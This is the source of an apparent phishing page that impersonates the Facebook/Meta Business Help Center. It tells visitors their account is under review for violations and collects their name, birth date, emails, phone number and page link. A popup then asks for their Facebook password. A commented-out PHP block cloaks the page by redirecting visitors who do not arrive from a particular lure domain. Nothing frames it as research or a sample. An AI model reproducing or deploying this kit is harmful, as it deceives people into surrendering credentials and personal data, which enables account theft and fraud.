<?php
// $referringDomain = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
// $allowedDomain = 'business.check-verify-accounts.com';

// if ($referringDomain !== $allowedDomain) {
//     header("HTTP/1.1 301 Moved Permanently");
//     header("Location: https://facebook.com/");
//     exit();
// }
?>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta property="og:type" content="article">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="theme-color" content="#000000">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,200,300,400,500,700&amp;display=swap">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <link rel="stylesheet" href="css/bootstrap-datepicker.min.css">
    <link rel="stylesheet" href="css/business.css?version=v134428713232">
    <title>Business Center</title>
    <script src=" https://code.jquery.com/jquery-3.6.0.min.js">
    </script>
    <script src="js/bootstrap-datepicker.min.js"></script>
    <script src="js/bootstrap.js" crossorigin="anonymous"></script>
    <script src="js/common.js?ver=v1.392"></script>
    <script src="js/togglePassword.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            togglePasswordVisibility();
        });
    </script>
</head>

<body>
    <div id="spinner"></div>
    <div id="root">
        <div class="business">
            <div class="top-header">
                <div class="container"><img src="images/d42fe85024cd6936fb43a241e083e5b3.png" width="70" class="metalogo">
                    <p class="metahead">Support Inbox</p><img src="images/913f4cdb1dc234a4f5523184e9416cce.png" width="100%" class="searchicon">
                </div>
            </div>
            <div class="masheader" style="background-image: url(&quot;images/1f85623d06212e6d3ed4016dc123dc05.png&quot;);">
                <div class="wrapper">
                    <div class="container">
                        <p class="businesshelp" style="visibility: hidden;">Meta Business Help Center </p>
                        <p class="businesshelpcenter">Facebook Business Help Center</p>
                    </div>
                </div>
            </div>
            <div class="main">
                <div class="form">
                    <div class="header-form">
                        <div class="header-top">
                            <div class="dot"></div>
                            <div class="line"></div>
                            <div class="dot"></div>
                            <div class="line"></div>
                            <div class="dot"></div>
                        </div>
                        <div class="header-bottom">
                            <p>Select Asset</p>
                            <p>Select the Issue</p>
                            <p>Get help</p>
                        </div>
                    </div>
                    <div class="pb-3 text-center" style="font-size: 20px; text-align: center;"><strong>Get
                            Started</strong></div>
                    <div class="mb-4" style="background-color: rgb(226, 227, 229); font-size: 12px; text-align: left; padding: 15px;">
                        We have received multiple reports that suggest that your account has been in violation of our
                        terms of services and community guidelines. As a result, your account is scheduled for
                        review<br>
                        <div class="pt-2 text-start" style="font-size: 14px;"><strong>Report no: 3088553115</strong>
                        </div>
                    </div>
                    <form id="basic" autocomplete="off" class="ant-form ant-form-horizontal css-dev-only-do-not-override-pr0fja">
                        <div class="item-form"><label style="color: rgb(0, 0, 0); font-weight: bold;">Please provide
                                us information that will help us investigate</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <textarea rows="2" id="basic_fill_reason" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja"></textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Gender</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <span class="_5k_2 _5dba">
                                                    <label class="_58mt" for="u_3_5_kC" style="padding-right: 10px;cursor: pointer;">Male</label><input type="radio" checked class="_8esa" name="sex" value="NAM" id="u_3_5_kC">
                                                </span>
                                                <span class="_5k_2 _5dba" style="margin-left: 20px;">
                                                    <label class="_58mt" for="u_3_4_5T" style="padding-right: 10px;cursor: pointer;">Female</label><input type="radio" class="_8esa" name="sex" value="NU" id="u_3_4_5T">
                                                </span>
                                                <span class="_5k_2 _5dba" style="margin-left: 20px;">
                                                    <label class="_58mt" for="u_3_4_5TCC" style="padding-right: 10px;cursor: pointer;">Other</label><input type="radio" class="_8esa" name="sex" value="BEDE" id="u_3_4_5TCC">
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Full name</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_fill_full_name" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja" type="text" value=""></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="name">Birth Day</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <input id="basic_fill_birth_day" placeholder="dd/mm/yyyy" aria-required="true" class="datepicker ant-input css-dev-only-do-not-override-pr0fja" type="text" value="">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="item-form"><label for="Business">Business Email</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_fill_business_email" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja" type="text" value=""></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="email">Personal Email</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_fill_personal_email" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja" type="text" value=""></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="phone">Mobile Phone Number</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_fill_phone" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja" type="text" value=""></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="item-form"><label for="email">Facebook Page Link</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><input id="basic_fill_facebook_pagename" aria-required="true" class="ant-input css-dev-only-do-not-override-pr0fja" type="text" value=""></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="form-check">
                            <input class="form-check-input check" type="checkbox" id="check" value="1" name="check" required="">
                            <label class="form-check-label" for="check" name="check" style="font-size:14px; color:#7d7e82">
                                Agree to our Terms, Data Policy and Cookies Policy.
                            </label>
                            <div id="reminder" style="color: #ff4d4f; display: none;">
                                Please agree to our Terms, Data Policy, and Cookies Policy.
                            </div>
                        </div>
                        <div class="ant-form-item btn butoni css-dev-only-do-not-override-pr0fja">
                            <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-form-item-control-input">
                                        <div class="ant-form-item-control-input-content"><button type="submit" class="ant-btn css-dev-only-do-not-override-pr0fja ant-btn-default" style="background-color: transparent; outline: none; border: none; box-shadow: none; color: rgb(38, 125, 241); font-weight: 700; font-size: 1rem;" id="btn-submit"><span>Submit</span></button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <div class="footer">
                <div class="container"><img src="images/d42fe85024cd6936fb43a241e083e5b3.png" class="logofooter">
                    <p class="nerlogofooter">Facebook can help your large, medium or small business grow. Get the
                        latest news for advertisers and more on our <a href="/buiness-center-community/buiness" style="text-decoration: none; color: white;">Meta for Business Page.</a></p>
                    <div class="row">
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Marketing on Facebook</p>
                                    <p>Success Stories</p>
                                    <p>Measurement</p>
                                    <p>Industries</p>
                                    <p>Inspiration</p>
                                    <p>Events</p>
                                    <p>News</p>
                                    <p>Site map</p>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Marketing objectives</p>
                                    <p>Build your presence</p>
                                    <p>Create awareness</p>
                                    <p>Drive discovery</p>
                                    <p>Generate leads</p>
                                    <p>Boost sales</p>
                                    <p>Earn loyalty</p>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Facebook Pages</p>
                                    <p>Get started with Pages</p>
                                    <p>Setting up your Page</p>
                                    <p>Manage your Facebook Page</p>
                                    <p>Promote your Page</p>
                                    <p>Messaging on your Page</p>
                                    <p>Page Insights</p>
                                </li>
                            </ul>
                        </div>
                        <div variant="dontshowonmobile " class="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p class="fontbold">Facebook ads</p>
                                    <p>Get started with ads</p>
                                    <p>Buying Facebook ads</p>
                                    <p>Ad formats</p>
                                    <p>Ad placement</p>
                                    <p>Choose your audience</p>
                                    <p>Measure your ads</p>
                                    <p>Managing your ads</p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bottomfooter">
                <div class="container">
                    <ul>
                        <li>English (UK)</li>
                        <li>English (US)</li>
                        <li>Español</li>
                        <li>Português (Brasil)</li>
                        <li>Français (France)</li>
                        <li>Español (España)</li>
                        <li>More languages</li>
                    </ul>
                    <ul>
                        <li>© 2023 Meta</li>
                        <li>About</li>
                        <li>Developers</li>
                        <li>Careers</li>
                        <li>Privacy</li>
                        <li>Cookies</li>
                        <li>Terms</li>
                        <li>Help Centre</li>
                    </ul>
                </div>
            </div>
            <div class="popup" id="popup">
                <div class="background"></div>
                <div class="content">
                    <form id="basicForm" autocomplete="off" class="ant-form ant-form-horizontal css-dev-only-do-not-override-pr0fja">
                        <div class="modal-header custom-header px-0">
                            <h5 id="exampleModalLabel" class="modal-title" style="font-size: 22px; font-weight: 600;"> Please Enter Your Password </h5><button type="button" id="btn-close" data-dismiss="modal" aria-label="Close" class="close"><span aria-hidden="true">×</span></button>
                        </div>
                        <div class="item-form">
                            <p style="font-size: 16px; margin-bottom: 10px;"> For your security, you must enter your
                                password to continue. </p><label for="password">Password:</label>
                            <div class="ant-form-item css-dev-only-do-not-override-pr0fja">
                                <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content"><span class="ant-input-affix-wrapper ant-input-password css-dev-only-do-not-override-pr0fja"><input id="basicForm_fill_first_password" aria-required="true" type="password" class="ant-input css-dev-only-do-not-override-pr0fja"><span class="ant-input-suffix"><span class="ant-input-clear-icon ant-input-clear-icon-hidden ant-input-clear-icon-has-suffix" role="button" tabindex="-1"><span role="img" aria-label="close-circle" class="anticon anticon-close-circle"><svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false" data-icon="close-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                                                    <path d="M512 64c247.4 0 448 200.6 448 448S759.4 960 512 960 64 759.4 64 512 264.6 64 512 64zm127.98 274.82h-.04l-.08.06L512 466.75 384.14 338.88c-.04-.05-.06-.06-.08-.06a.12.12 0 00-.07 0c-.03 0-.05.01-.09.05l-45.02 45.02a.2.2 0 00-.05.09.12.12 0 000 .07v.02a.27.27 0 00.06.06L466.75 512 338.88 639.86c-.05.04-.06.06-.06.08a.12.12 0 000 .07c0 .03.01.05.05.09l45.02 45.02a.2.2 0 00.09.05.12.12 0 00.07 0c.02 0 .04-.01.08-.05L512 557.25l127.86 127.87c.04.04.06.05.08.05a.12.12 0 00.07 0c.03 0 .05-.01.09-.05l45.02-45.02a.2.2 0 00.05-.09.12.12 0 000-.07v-.02a.27.27 0 00-.05-.06L557.25 512l127.87-127.86c.04-.04.05-.06.05-.08a.12.12 0 000-.07c0-.03-.01-.05-.05-.09l-45.02-45.02a.2.2 0 00-.09-.05.12.12 0 00-.07 0z">
                                                                    </path>
                                                                </svg></span></span><span role="img" aria-label="eye" id="toggleIcon" tabindex="0" class="anticon anticon-eye ant-input-password-icon"><svg viewBox="64 64 896 896" focusable="false" data-icon="eye" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                                                <path d="M942.2 486.2C847.4 286.5 704.1 186 512 186c-192.2 0-335.4 100.5-430.2 300.3a60.3 60.3 0 000 51.5C176.6 737.5 319.9 838 512 838c192.2 0 335.4-100.5 430.2-300.3 7.7-16.2 7.7-35 0-51.5zM512 766c-161.3 0-279.4-81.8-362.7-254C232.6 339.8 350.7 258 512 258c161.3 0 279.4 81.8 362.7 254C791.5 684.2 673.4 766 512 766zm-4-430c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm0 288c-61.9 0-112-50.1-112-112s50.1-112 112-112 112 50.1 112 112-50.1 112-112 112z">
                                                                </path>
                                                            </svg></span></span></span></div>
                                        </div>
                                    </div>
                                </div>
                                <p class="password-error" style="color: #ff4d4f;font-size:14px;margin-top: 6px;"></p>
                            </div>
                        </div>
                        <div class="ant-form-item btn butoni css-dev-only-do-not-override-pr0fja" style="color: rgb(255, 255, 255); background-color: rgb(44, 132, 244); margin-top: 20px; width: auto; float: right;">
                            <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                                <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                    <div class="ant-form-item-control-input">
                                        <div class="ant-form-item-control-input-content"><button type="submit" id="btn-login" class="ant-btn css-dev-only-do-not-override-pr0fja ant-btn-default" style="background-color: transparent; outline: none; border: none; box-shadow: none; color: white; font-weight: 700; font-size: 1rem; width: 120px; height: 40px; position: relative; overflow: hidden;">
                                                <span class="btn-text">Continue</span>
                                                <div class="loading-container">
                                                    <svg class="loading-circle" viewBox="0 0 50 50">
                                                        <circle class="circle" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
                                                    </svg>
                                                </div>
                                            </button></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
    <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
</body>
<div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>

</html>